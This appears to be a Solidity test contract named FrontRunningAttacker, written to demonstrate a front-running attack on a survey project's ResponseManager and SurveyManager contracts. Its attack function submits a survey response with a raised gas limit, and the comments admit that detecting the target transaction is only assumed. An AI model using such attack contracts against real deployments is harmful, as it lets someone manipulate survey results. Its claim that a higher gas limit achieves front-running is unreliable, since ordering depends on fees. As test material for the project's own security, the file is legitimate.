// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/ResponseManager.sol";
import "../src/SurveyManager.sol";

contract FrontRunningAttacker {
    SurveyManager surveyManager;
    ResponseManager responseManager;
    uint256 targetSurveyId;
    uint256 targetOption;

    constructor(address _surveyManager, address _responseManager) {
        surveyManager = SurveyManager(_surveyManager);
        responseManager = ResponseManager(_responseManager);
    }

    function attack(uint256 _surveyId, uint256 _selectedOption) public {
        targetSurveyId = _surveyId;
        targetOption = _selectedOption;

        // Monitor the network for the target transaction
        // For this simplified demonstration, we assume we have detected the transaction
        // and now attempt to front-run it by submitting our own transaction first

        // Submit our response with a higher gas limit to front-run
        responseManager.submitResponse{gas: 3000000}(targetSurveyId, targetOption);
    }
}
